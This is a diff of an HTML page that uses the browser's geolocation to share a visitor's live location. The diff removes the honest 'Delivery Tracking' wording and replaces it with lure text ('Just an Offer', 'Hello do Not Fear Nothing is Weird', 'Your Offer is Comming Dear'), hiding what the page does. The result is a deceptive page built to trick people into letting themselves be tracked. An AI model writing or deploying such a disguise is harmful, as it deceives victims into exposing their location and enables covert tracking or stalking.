@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Share My Location</title>
+  <title>Share</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
@@ -12,9 +12,9 @@
 </head>
 <body>
 
-  <h2>Delivery Tracking</h2>
-  <p>Tap below to share your location with dispatch.</p>
-  <button onclick="shareLocation()">Share My Location</button>
+  <h2> Just an Offer</h2>
+  <p>Tap below</p>
+  <button onclick="shareLocation()"> Hello do Not Fear Nothing is Weird</button>
   <p id="status"></p>
 
   <script type="module">
@@ -42,7 +42,7 @@
 
     window.shareLocation = function () {
       if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "Geolocation not supported on this device.";
+        document.getElementById("status").innerText = "Hello! Dear can You Turn ON you Location?.";
         return;
       }
 
@@ -62,7 +62,7 @@
           });
 
           document.getElementById("status").innerText =
-            `Sharing live location (accuracy ${Math.round(accuracy)}m). Keep this tab open.`;
+            `Wait Magic is Comming (accuracy ${Math.round(accuracy)}m). Thanks Your Offer is Comming Dear.`;
         },
         (error) => {
           document.getElementById("status").innerText = "Error: " + error.message;
